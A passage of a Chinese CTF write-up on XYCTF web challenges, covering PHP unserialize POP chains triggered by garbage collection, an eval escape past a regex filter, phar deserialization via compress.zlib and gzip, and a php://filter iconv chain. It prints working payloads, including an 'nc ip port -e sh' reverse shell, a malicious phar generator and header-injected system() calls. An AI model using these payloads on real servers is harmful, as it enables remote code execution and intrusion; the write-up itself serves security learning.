<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$B</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发回收&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$A</span>=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$A</span>=<span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;抛出异常&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>上面的代码输出了触发回收。即其触发了__destruct()<br>可以看出当我们重新将对象赋值为NULL时触发了GC回收机制。</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>这里我就直接使用这题来演示如何利用。<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 A &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;s-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BBB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 B &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        <span class="variable">$b</span>=<span class="variable">$_POST</span>;</span><br><span class="line">        <span class="variable">$c</span>=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="variable">$d</span>=<span class="variable language_">$this</span>-&gt;d;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$a</span>,<span class="variable">$b</span>)(<span class="variable">$c</span>)(<span class="variable">$d</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CCC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 C &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>]);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;noooooob!!!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们还是首先找链子明显可以看出链子张这样<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CCC&#123;__destruct&#125;-&gt;AAA&#123;__tostring&#125;-&gt;BBB&#123;__get&#125;</span><br></pre></td></tr></table></figure><br>那么第一个问题就是怎么触发__destruct。因为其再程序尾部抛出了异常。导致无法正常触发所以我们使用GC回收机制。链子构造如下<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;lalala&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 A &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;s-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BBB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 B &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        <span class="variable">$b</span>=<span class="variable">$_POST</span>;</span><br><span class="line">        <span class="variable">$c</span>=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="variable">$d</span>=<span class="variable language_">$this</span>-&gt;d;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$a</span>,<span class="variable">$b</span>)(<span class="variable">$c</span>)(<span class="variable">$d</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CCC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 C &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">CCC</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;c=<span class="keyword">new</span> <span class="title function_ invoke__">AAA</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;c-&gt;s=<span class="keyword">new</span> <span class="title function_ invoke__">BBB</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">array</span>(<span class="string">&quot;0&quot;</span>=&gt;<span class="variable">$a</span>,<span class="string">&quot;1&quot;</span>=&gt;<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line">---------------------------------------</span><br><span class="line">a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;O:<span class="number">3</span>:<span class="string">&quot;CCC&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;AAA&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;s&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;BBB&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;N;s:<span class="number">1</span>:<span class="string">&quot;d&quot;</span>;N;&#125;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;lalala&quot;</span>;&#125;&#125;i:<span class="number">0</span>;N;&#125;</span><br></pre></td></tr></table></figure><br>我们将输出的序列化进行小小的修改将最后的1该为0即数组原本是键1执行了NULL在修改后会变为键0指向NULL而0本来指向一个实例这也就导致了实例被销毁触发了GC回收机制<br>那么我们最后的问题就是如何利用最后的后门函数了。<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BBB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 B &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        <span class="variable">$b</span>=<span class="variable">$_POST</span>;</span><br><span class="line">        <span class="variable">$c</span>=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="variable">$d</span>=<span class="variable language_">$this</span>-&gt;d;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$a</span>,<span class="variable">$b</span>)(<span class="variable">$c</span>)(<span class="variable">$d</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>首先我们可以看到最后的函数时链式调用，这导致了我们无法直接使用回调函数直接使用后门类函数。但是我们只要能使得<code>call_user_func($a,$b)($c)</code>返回值为system那么我们就可以调用system函数啦。我们一步步会推。我们只要使得<code>call_user_func($a,$b)</code>返回值为<code>urldecode</code>就可以使其返回值为<code>$c</code>的值了。其中$a和$b我们都可控但是$b为数组并且删除了键a的值，那么这时候我就想到了直接强制类型转换是不是就可以直接返回$b的值呢。经过尝试是的。<br>那么结果就很明确了。<br></p>
<h1 id="牢牢记住，逝者为大"><a href="#牢牢记住，逝者为大" class="headerlink" title="牢牢记住，逝者为大"></a>牢牢记住，逝者为大</h1><p>说实话基础还是太差了，每次遇到waf都头疼，写这题的时候绕的累死了。<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Kobe</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>) &gt; <span class="number">13</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;see you again~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/echo|exec|eval|system|fputs|\.|\/|\\|/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;肘死你&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$val_name</span> =&gt; <span class="variable">$val_val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bin|mv|cp|ls|\||f|a|l|\?|\*|\&gt;/i&quot;</span>, <span class="variable">$val_val</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;what can i say&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">Kobe</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;#man,&quot;</span> . <span class="variable">$cmd</span>  . <span class="string">&quot;,manba out&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;#man,&quot;</span> . <span class="variable">$cmd</span> . <span class="string">&quot;,mamba out&quot;</span>);</span><br></pre></td></tr></table></figure><br>我们可以看到其对输入字符数做了限制，那么第一时间肯定是尝试进行逃逸。在写这题的时候对逃逸的知识并不是特别了解只知道可以通过eval($_GET())这种姿势进行逃逸，但是在这题明显是无法使用的，那么这时候我有想到使用反引号效果会不会成功呢?。在尝试后发现确实是可以成功，只是无法回显。但是要成功命令执行需要将前后的字符串进行绕过。我在网上查了好一会终于查到了可以使用换行符绕过前面的注释符，而后面的字符直接注释即可，在这次的比赛里我还学到了一个不需要字符即可对后拼接的字符进行注释的方法。先不说后面的其他题目会提到。<br>总结一下就可以知道逃逸的语句应该如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0a`$_GET[1]`%23</span><br></pre></td></tr></table></figure><br>但是逃逸后我们还无法任意的命令执行这是因为，下面的代码<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$val_name</span> =&gt; <span class="variable">$val_val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bin|mv|cp|ls|\||f|a|l|\?|\*|\&gt;/i&quot;</span>, <span class="variable">$val_val</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;what can i say&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>这句话是将全局变量$_GET进行遍历在进行正则匹配。这就对我们逃逸的内容进行了限制，但是我们可以发现其没有对nc进行限制，那么我们直接nc反弹shell<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?cmd=%<span class="number">0</span>a`<span class="variable">$_GET</span>[<span class="number">1</span>]`%<span class="number">23</span>&amp;<span class="number">1</span>=nc ip  port -e sh</span><br></pre></td></tr></table></figure></p>
<h1 id="pharme"><a href="#pharme" class="headerlink" title="pharme"></a>pharme</h1><p>这道题目主要是考phar反序列化这道题目也是学到了很多<br>我们先查看class.php可以看到如下代码<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;ch3nx1&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/;+/&#x27;</span>,<span class="string">&#x27;ch3nx1&#x27;</span>,<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[A-Za-z_\(\)]+/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$this</span>-&gt;cmd)))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd.<span class="string">&#x27;isbigvegetablechicken!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^phar:\/\//i&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们打开class.php可以发现 evil类里用eval函数<br>而前面的waf导致我们只能给cmd传入字母,下划线,和小括号。我们可以使用phar的文件尾进行截断来绕过后面字符的拼接。<code>__HALT_COMPILER();</code>该文件尾部后的代码都不会被识别。<br>或者使用<code>__halt_compiler();</code>来中断编译器。<br>还有一个点是：由于我们无法输入引号所有我们需要进行逃逸，又因为我们无法输入<code>$</code>所有我们使用函数来进行无参命令执行。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>而下面的文件处理函数可以触发phar反序列化，其waf使得无法再字符头部出现phar，但是我们可以使用伪协议嵌套来绕过。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> Bzip/Gzip 当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://绕过</span><br><span class="line">compress.bzip://phar:///test.phar/test.txt</span><br><span class="line">compress.bzip2://phar:///home/sx/test.phar/test.txt</span><br><span class="line">compress.zlib://phar:///home/sx/test.phar/test.txt</span><br><span class="line">php://filter/resource=phar:///test.phar/test.txt</span><br><span class="line"></span><br><span class="line">php://filter/read=convert.base64-encode/resource=phar://phar.phar</span><br></pre></td></tr></table></figure><br>上面的所有都可以触发phar反序列化<br>然后我们再上传的时候提示我们文件中不能出现<code>__HALT_COMPILER();</code>这个我们可以使用gzip来绕过，将该文件使用gzip压缩后上传，仍然可以使用pahr来触发反序列化，而被压缩的文件中也就没有该文件尾了。<br>下面开始制作攻击phar文件<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;eval(end(getallheaders()));__HALT_COMPILER();&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;ch3nx1&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/;+/&#x27;</span>,<span class="string">&#x27;ch3nx1&#x27;</span>,<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[A-Za-z_\(\)]+/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$this</span>-&gt;cmd)))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd.<span class="string">&#x27;isbigvegetablechicken!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<span class="comment">//设置sutb</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);<span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;1.txt&quot;</span>,<span class="string">&quot;123123&gt;&quot;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><br>将生成的文件再kali下使用gzip压缩，改后缀为jpg上传，之后进行触发。<br><img src="/2024/04/25/XYCTF-web/1.png" class="" title="alt text"><br>记下文件名用于触发。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /class.php HTTP/1.1</span><br><span class="line">Host: 192.168.223.1:14144</span><br><span class="line">Content-Length: 85</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://192.168.223.1:14144</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://192.168.223.1:14144/class.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">a: system(&#x27;cat flag&#x27;);</span><br><span class="line"></span><br><span class="line">file=compress.zlib://phar%3A%2F%2F%2Ftmp%2F628941e623f5a967093007bf39be805f.jpg</span><br></pre></td></tr></table></figure></p>
<h1 id="连连看到底是连连什么看"><a href="#连连看到底是连连什么看" class="headerlink" title="连连看到底是连连什么看"></a>连连看到底是连连什么看</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|=|php|file|:|\/|\?/i&quot;</span>, <span class="variable">$p</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;waf!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&quot;php://filter/<span class="subst">$p</span>/resource=/etc/passwd&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$payload</span>)===<span class="string">&quot;XYCTF&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以很明显的看出来是要使用过滤器来进行构造出XYCTF下面是文章<br><a href="https://tttang.com/archive/1395/#toc_php-base64-filter">hxp CTF 2021 - The End Of LFI?</a><br><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=1#reply-list">谈一谈php://filter的妙用</a><br>第一篇文章的构造方法在网上可以找到脚本，整体原理就是利用字符集的转换和base64过滤器的宽泛性来进行构造。<br>我们使用脚本跑出来的只能在文件的头部构造出XYCTF。如下<br><br>这时候我们需要使用到string.strip_tags这个过滤器，这个过滤器可以删除标签那么我们构造XYCTF&lt;?<br>最后再使用string.strip_tags对多余的内容进行删除即可<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|string.strip_tags/resource=/etc/passwd</span><br></pre></td></tr></table></figure></p>
